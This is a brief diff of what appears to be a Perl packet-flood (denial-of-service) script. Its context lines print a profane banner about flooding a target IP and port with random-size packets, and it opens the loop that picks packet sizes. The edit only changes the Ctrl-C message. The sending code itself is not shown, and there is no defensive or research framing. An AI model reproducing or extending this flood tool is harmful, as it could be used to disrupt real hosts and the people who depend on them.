@@ -34,7 +34,7 @@ EOTEXT
 print "Shitting on skids ip $ip " . ($port ? $port : "random") . " port with " . 
   ($size ? "$size-byte" : "random size") . " packets" . 
   ($time ? " for $time seconds" : "") . "\n";
-print "Stop Eating Doritos with Ctrl-C\n" unless $time;
+print "Stop Shitting with Ctrl-C\n" unless $time;
  
 for (;time() <= $endtime;) {
   $psize = $size ? $size : int(rand(1024-64)+64) ;
